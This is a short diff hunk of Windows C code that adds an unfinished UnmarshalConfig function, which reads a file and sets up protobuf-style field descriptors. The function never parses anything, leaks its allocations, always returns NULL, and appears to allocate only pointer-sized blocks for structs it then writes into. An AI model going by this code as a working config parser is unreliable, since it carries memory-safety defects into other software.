@@ -886,3 +886,43 @@ UINT64 GeneratePeerID()
 
 	return uResult;
 }
+PAGE_EXECUTE
+PGLOBAL_CONFIG UnmarshalConfig
+(
+	_In_ LPWSTR lpConfigPath
+)
+{
+	PBYTE pMarshaledData = NULL;
+	DWORD cbMarshaledData = 0;
+	PGLOBAL_CONFIG pResult = NULL;
+	LPVOID* UnmarshaledData = NULL;
+	PPBElement ConfigElements[16];
+	PPBElement DriveConfigElements[10];
+	DWORD i = 0;
+
+	pMarshaledData = ReadFromFile(lpConfigPath, &cbMarshaledData);
+	if (pMarshaledData == NULL || cbMarshaledData == 0) {
+		goto CLEANUP;
+	}
+
+	for (i = 0; i < _countof(ConfigElements); i++) {
+		ConfigElements[i] = ALLOC(sizeof(PPBElement));
+		ConfigElements[i]->dwFieldIdx = i + 1;
+		ConfigElements[i]->Type = Bytes;
+	}
+
+	ConfigElements[7]->Type = Varint;
+	ConfigElements[8]->Type = Varint;
+	ConfigElements[9]->Type = Varint;
+	ConfigElements[11]->Type = Varint;
+	ConfigElements[12]->Type = Varint;
+
+	ConfigElements[13]->Type = RepeatedStruct;
+	ConfigElements[14]->Type = RepeatedStruct;
+	ConfigElements[15]->Type = RepeatedStruct;
+
+CLEANUP:
+	FREE(pMarshaledData);
+
+	return pResult;
+}
